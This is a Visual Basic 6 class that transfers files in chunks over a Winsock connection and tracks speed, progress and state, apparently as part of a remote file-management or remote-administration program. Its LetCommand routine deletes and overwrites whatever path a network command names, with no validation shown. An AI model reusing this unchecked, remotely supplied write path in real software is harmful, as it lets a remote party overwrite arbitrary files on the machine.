VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
  Persistable = 0  'NotPersistable
  DataBindingBehavior = 0  'vbNone
  DataSourceBehavior  = 0  'vbNone
  MTSTransactionMode  = 0  'NotAnMTSObject
END
Attribute VB_Name = "clsFileTransfer"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Option Explicit

Private Declare Function GetTickCount Lib "kernel32.dll" () As Long

Public Enum ClassServerDataType
    enuFileRecibed = 1
    enuFileSend = 2
End Enum

Public SocketID                 As Long
Public mDestPath                As String
Public mFileSize                As Currency
Public mFilename                As String
Public cServerDataType          As ClassServerDataType
Public clsType                  As ClassType
Public sState                   As String

Private mIP                     As String
Private Pos                     As Currency
Private FF                      As Integer
Private mPath                   As String
Private ArrArchivo()            As Byte
Private CantidadTrozos          As Long
Private Resto                   As Long
Private m_StartTime             As Long
Private bCancelarTransferencia  As Boolean
Private WithEvents Timer1       As cTimer
Attribute Timer1.VB_VarHelpID = -1


Public Property Get FilePos() As Currency
    If cServerDataType = enuFileRecibed Then
        FilePos = Pos
    Else
        FilePos = Pos * 1024
        If FilePos > mFileSize Then FilePos = mFileSize
    End If
End Property

Public Sub Cancel()

    bCancelarTransferencia = True
    
    If cServerDataType = enuFileRecibed Then
        sState = "Cancelado"
        MdlGlobal.TerminateConnection SocketID
    End If
    
    
End Sub

Public Property Get TimeRemaining() As String
    On Error Resume Next

    If sState = "Error" Or sState = "Cancelado" Then Exit Property

    Dim KBDesc As Long, KBRest As Long, TimeElapsed As Long
    
    If cServerDataType = enuFileRecibed Then
        If Pos < mFileSize Then
            KBDesc = Pos \ 1024
            KBRest = (mFileSize - Pos) \ 1024
            TimeElapsed = (GetTickCount - m_StartTime) \ 1000
            TimeRemaining = SecondToTime((KBRest / KBDesc) * TimeElapsed)
        End If
    Else
        If Pos <= CantidadTrozos Then
            KBRest = (CantidadTrozos - Pos)
            TimeElapsed = (GetTickCount - m_StartTime) \ 1000
            TimeRemaining = SecondToTime((KBRest / Pos) * TimeElapsed)
        End If
    End If
End Property

Public Property Get Speed() As String
    On Error Resume Next

    Dim KBDesc As Long, TimeElapsed As Long, FilePos As Currency
    
    If sState = "Error" Or sState = "Cancelado" Then Exit Property
    
    If cServerDataType = enuFileRecibed Then

        If Pos < mFileSize Then
            KBDesc = Pos \ 1024
        
            TimeElapsed = (GetTickCount - m_StartTime) \ 1000
            Speed = (KBDesc \ TimeElapsed) & " Kb/Seg"
        End If
    
    Else
        If Pos <= CantidadTrozos Then
            TimeElapsed = (GetTickCount - m_StartTime) \ 1000
            Speed = (Pos \ TimeElapsed) & " Kb/Seg"
        End If
    End If
    
End Property

Public Property Get IP() As String
   IP = mIP
End Property

Private Sub Class_Initialize()
    Set Timer1 = New cTimer
    clsType = enuFileTransfer
End Sub

Public Sub LetCommand(sCommand() As String)

On Error GoTo DestroyConnection

    m_StartTime = GetTickCount
    cServerDataType = sCommand(1)
    
    mIP = WinSock32.IPAddresses(CStr(SocketID))
    
    If cServerDataType = enuFileRecibed Then
        mFileSize = sCommand(3)
        mDestPath = sCommand(4)
        mFilename = GetPathFileName(mDestPath)
        FF = FreeFile
        If Dir(mDestPath) <> vbNullString Then Kill mDestPath
        Open mDestPath For Binary As #FF
        If WinSock32.SendData(SocketID, "OK") Then
            sState = "Descargando"
        Else
            GoTo DestroyConnection
        End If
    Else
        mPath = GetPathFromIDList(sCommand(2))
        mFilename = GetPathFileName(mPath)
        mFileSize = GetFileSize(mPath)
        
        If mFileSize = 0 Then
            sState = "Completo"
            Exit Sub
        End If
        SendFile mPath
    End If
    
    Exit Sub
    
DestroyConnection:
    sState = "Error"
    bCancelarTransferencia = True
    MdlGlobal.TerminateConnection SocketID
End Sub

Public Sub Socket_Conect(id As Long, IP As String, Puerto As String)

End Sub

Public Sub Socket_DataArrival(id As Long, IP As String, Puerto As String, Data As String)
    If mFileSize > 0 Then
        Put #FF, , Data
        Pos = Pos + Len(Data)

        If Pos = mFileSize Then
            sState = "Completo"
            FrmMain.EndFileTransfer Me
            'FrmMain.RefreshList
            
        End If
    End If
End Sub

Public Sub Socket_Close(id As Long, IP As String, Puerto As String)
    If cServerDataType = enuFileRecibed Then
        If Pos < mFileSize And mFileSize > 0 Then
            sState = "Error"
        Else
            sState = "Completo"
        End If
    Else
 
       If Pos <= CantidadTrozos And mFileSize > 0 Then
            sState = "Error"
       Else
            sState = "Completo"
            'FrmMain.EndFileTransfer Me
       End If
    End If

    'FrmMain.RefreshList
    MdlGlobal.TerminateConnection SocketID

End Sub

Public Property Get Percent() As Long
    On Error Resume Next
    If mFileSize = 0 And sState = "Completo" Then
        Percent = 100
    Else
        If cServerDataType = enuFileRecibed Then
            Percent = Pos * 100 / mFileSize
        Else
            Percent = Pos * 100 / (CantidadTrozos + 1)
        End If
    End If
End Property


Private Sub SendFile(ByVal sPath As String)

On Error GoTo DestroyConnection
    ReDim ArrArchivo(1 To 1024)
    CantidadTrozos = mFileSize \ 1024
    Resto = mFileSize - (CantidadTrozos * 1024)
    FF = FreeFile
    Open sPath For Binary As #FF
    Pos = 1
    sState = "Transfiriendo"
    Timer1.CreateTimer 1
    
    Exit Sub
    
DestroyConnection:
    sState = "Error"
    bCancelarTransferencia = True
    MdlGlobal.TerminateConnection SocketID
    
End Sub

Private Sub SendPart()

On Error GoTo DestroyConnection

    If Pos <= CantidadTrozos Then

        If bCancelarTransferencia Then
    
            sState = "Cancelado"
            GoTo DestroyConnection
        Else
            Get #FF, , ArrArchivo
            If WinSock32.SendData(SocketID, ArrArchivo) Then
                Pos = Pos + 1
                
                Timer1.CreateTimer 1
            Else
                sState = "Error"
                 bCancelarTransferencia = True
                GoTo DestroyConnection
            End If
        End If
        
    Else
        If Resto > 0 Then
            ReDim ArrArchivo(1 To Resto)
            Get #FF, , ArrArchivo
            If WinSock32.SendData(SocketID, ArrArchivo) Then
                sState = "Completo"
                FrmMain.EndFileTransfer Me
            Else
                sState = "Error"
                bCancelarTransferencia = True
                GoTo DestroyConnection
            End If
        Else
            sState = "Completo"
            FrmMain.EndFileTransfer Me
        End If
    End If
    
    Exit Sub
DestroyConnection:
    If Err.Number Then bCancelarTransferencia = True
    MdlGlobal.TerminateConnection SocketID
End Sub

Private Sub Class_Terminate()
    Set Timer1 = Nothing
    If FF Then Close #FF
    If SocketID And bCancelarTransferencia Then WinSock32.WsClose SocketID
End Sub

Private Sub Timer1_Timer(ByVal ThisTime As Long)
    Timer1.DestroyTimer
    SendPart
End Sub

Private Function SecondToTime(ByVal nTimeInSeconds As Long) As String
    On Error Resume Next
    Dim nHours              As Long
    Dim nMinutes            As Long
    Dim nSeconds            As Long
    Dim sTime               As String
    
    nHours = nTimeInSeconds \ 3600
    nTimeInSeconds = nTimeInSeconds Mod 3600
    nMinutes = nTimeInSeconds \ 60
    nSeconds = nTimeInSeconds Mod 60
    
    If nHours Then sTime = Format(nHours, "#0") & ":"
    SecondToTime = sTime & Format(nMinutes, "#0") & ":" & Format(nSeconds, "00")

End Function

